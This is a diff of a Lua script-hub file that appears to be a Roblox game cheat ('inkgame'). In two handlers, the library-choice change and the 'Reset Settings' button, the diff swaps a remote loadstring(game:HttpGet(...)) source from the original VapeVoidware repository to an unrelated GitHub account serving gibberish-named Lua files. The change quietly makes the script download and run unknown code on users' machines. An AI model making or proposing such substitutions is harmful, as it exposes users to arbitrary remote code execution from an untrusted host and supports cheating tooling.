@@ -4286,7 +4286,7 @@ Options.LibraryChoice:OnChanged(function(val)
     if shared.VoidDev and isfile("inkgame.lua") then
         loadstring(readfile("inkgame.lua"))()
     else
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/inkgame.lua", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/kzkrjfhrbdbd/Skidd/refs/heads/main/Bdbbdbdddhdhehrb.lua", true))()
     end
 end)
 InformationGroup:AddDivider()
@@ -4317,7 +4317,7 @@ InformationGroup:AddButton("Reset Settings", function()
         pcall(function()
             Library:Unload()
         end)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/inkgame.lua", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/kzkrjfhrbdbd/Skidd/refs/heads/main/Hdjdjjdhddhehdh.lua", true))()
     else
         Script.Functions.Alert("[Save Settings]: Press the button again to reset your settings. This cannot be undone!", 5)
         approved = true
